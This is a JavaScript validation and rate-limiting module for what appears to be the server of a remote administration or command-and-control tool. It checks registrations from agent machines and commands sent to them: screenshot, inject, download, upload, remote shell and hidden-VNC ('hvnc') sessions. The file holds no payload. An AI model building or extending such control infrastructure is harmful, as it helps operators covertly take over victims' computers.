const { body, param, query, validationResult } = require('express-validator');
const rateLimit = require('express-rate-limit');

// Input sanitization utilities
const sanitizeInput = (input) => {
    if (typeof input !== 'string') return input;
    
    // Remove potentially dangerous characters
    return input
        .replace(/[<>]/g, '') // Remove angle brackets
        .replace(/javascript:/gi, '') // Remove javascript: protocol
        .replace(/on\w+=/gi, '') // Remove event handlers
        .trim()
        .substring(0, 1000); // Limit length
};

// Validation error handler
const handleValidationErrors = (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({
            status: 'error',
            message: 'Validation failed',
            errors: errors.array().map(err => ({
                field: err.path,
                message: err.msg,
                value: err.value
            }))
        });
    }
    next();
};

// Authentication validation
const validateAuth = [
    body('username')
        .isLength({ min: 3, max: 50 })
        .withMessage('Username must be between 3 and 50 characters')
        .matches(/^[a-zA-Z0-9_-]+$/)
        .withMessage('Username can only contain letters, numbers, underscores, and hyphens')
        .customSanitizer(sanitizeInput),
    
    body('password')
        .isLength({ min: 8, max: 128 })
        .withMessage('Password must be between 8 and 128 characters')
        .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/)
        .withMessage('Password must contain at least one lowercase letter, one uppercase letter, one number, and one special character'),
    
    handleValidationErrors
];

// Client registration validation
const validateClientRegistration = [
    body('uuid')
        .isUUID(4)
        .withMessage('Invalid UUID format'),
    
    body('hostname')
        .isLength({ min: 1, max: 255 })
        .withMessage('Hostname must be between 1 and 255 characters')
        .matches(/^[a-zA-Z0-9.-]+$/)
        .withMessage('Invalid hostname format')
        .customSanitizer(sanitizeInput),
    
    body('username')
        .isLength({ min: 1, max: 100 })
        .withMessage('Username must be between 1 and 100 characters')
        .customSanitizer(sanitizeInput),
    
    body('platform')
        .isIn(['windows', 'linux', 'macos', 'android', 'ios', 'unknown'])
        .withMessage('Invalid platform'),
    
    body('architecture')
        .isIn(['x64', 'x86', 'arm64', 'arm', 'unknown'])
        .withMessage('Invalid architecture'),
    
    body('version')
        .optional()
        .isLength({ max: 50 })
        .withMessage('Version must be less than 50 characters')
        .customSanitizer(sanitizeInput),
    
    body('capabilities')
        .optional()
        .isArray()
        .withMessage('Capabilities must be an array'),
    
    handleValidationErrors
];

// Command validation
const validateCommand = [
    body('command')
        .isIn(['screenshot', 'sysinfo', 'inject', 'download', 'upload', 'shell'])
        .withMessage('Invalid command type'),
    
    body('target')
        .isUUID(4)
        .withMessage('Invalid target UUID'),
    
    body('parameters')
        .optional()
        .isObject()
        .withMessage('Parameters must be an object'),
    
    // Validate specific command parameters
    body('parameters.url')
        .if(body('command').equals('download'))
        .isURL({ protocols: ['http', 'https'], require_protocol: true })
        .withMessage('Invalid download URL')
        .isLength({ max: 2048 })
        .withMessage('URL too long'),
    
    body('parameters.path')
        .if(body('command').equals('inject'))
        .isLength({ min: 1, max: 500 })
        .withMessage('Path must be between 1 and 500 characters')
        .customSanitizer(sanitizeInput),
    
    body('parameters.shellCommand')
        .if(body('command').equals('shell'))
        .isLength({ min: 1, max: 1000 })
        .withMessage('Shell command must be between 1 and 1000 characters')
        .customSanitizer(sanitizeInput),
    
    handleValidationErrors
];

// File upload validation
const validateFileUpload = [
    body('filename')
        .isLength({ min: 1, max: 255 })
        .withMessage('Filename must be between 1 and 255 characters')
        .matches(/^[a-zA-Z0-9._-]+$/)
        .withMessage('Invalid filename format')
        .customSanitizer(sanitizeInput),
    
    body('size')
        .isInt({ min: 1, max: 50 * 1024 * 1024 }) // 50MB max
        .withMessage('File size must be between 1 byte and 50MB'),
    
    handleValidationErrors
];

// WebSocket message validation
const validateWebSocketMessage = (data) => {
    const errors = [];
    
    if (!data || typeof data !== 'object') {
        errors.push('Message must be a valid JSON object');
        return errors;
    }
    
    // Validate message type
    const validTypes = [
        'register', 'heartbeat', 'command_result', 'data_upload', 'screenshot', 'sysinfo', 'auth', 'web_client',
        'agent_register', 'hvnc_start', 'hvnc_stop', 'hvnc_response', 'hvnc_frame', 'command', 'command_response'
    ];
    if (!data.type || !validTypes.includes(data.type)) {
        console.log('Invalid message type received:', data.type);
        console.log('Valid types are:', validTypes);
        console.log('Full message:', JSON.stringify(data));
        errors.push('Invalid message type');
    }
    
    // Validate UUID if present
    if (data.uuid && !/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(data.uuid)) {
        errors.push('Invalid UUID format');
    }
    
    // Sanitize string fields
    if (data.hostname) data.hostname = sanitizeInput(data.hostname);
    if (data.username) data.username = sanitizeInput(data.username);
    if (data.version) data.version = sanitizeInput(data.version);
    
    // Validate data size
    const messageSize = JSON.stringify(data).length;
    if (messageSize > 10 * 1024 * 1024) { // 10MB max
        errors.push('Message too large');
    }
    
    return errors;
};

// Rate limiting for sensitive operations
const authRateLimit = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: process.env.NODE_ENV === 'development' ? 1000 : 5, // Much higher limit in development
    message: {
        status: 'error',
        message: 'Too many authentication attempts, please try again later'
    },
    standardHeaders: true,
    legacyHeaders: false,
    trustProxy: true,
    // Skip rate limiting in development or for local IPs
    skip: (req) => {
        if (process.env.NODE_ENV === 'development' || process.env.BYPASS_RATE_LIMIT === 'true') {
            return true;
        }
        const developmentIPs = ['127.0.0.1', '::1', 'localhost'];
        const clientIP = req.ip || req.connection.remoteAddress;
        return developmentIPs.includes(clientIP) || clientIP?.startsWith('192.168.') || clientIP?.startsWith('10.');
    }
});

const commandRateLimit = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: process.env.NODE_ENV === 'development' ? 1000 : 10, // Much higher limit in development
    message: {
        status: 'error',
        message: 'Too many commands, please slow down'
    },
    standardHeaders: true,
    legacyHeaders: false,
    trustProxy: true,
    // Skip rate limiting in development or for local IPs
    skip: (req) => {
        if (process.env.NODE_ENV === 'development' || process.env.BYPASS_RATE_LIMIT === 'true') {
            return true;
        }
        const developmentIPs = ['127.0.0.1', '::1', 'localhost'];
        const clientIP = req.ip || req.connection.remoteAddress;
        return developmentIPs.includes(clientIP) || clientIP?.startsWith('192.168.') || clientIP?.startsWith('10.');
    }
});

module.exports = {
    validateAuth,
    validateClientRegistration,
    validateCommand,
    validateFileUpload,
    validateWebSocketMessage,
    handleValidationErrors,
    authRateLimit,
    commandRateLimit,
    sanitizeInput
};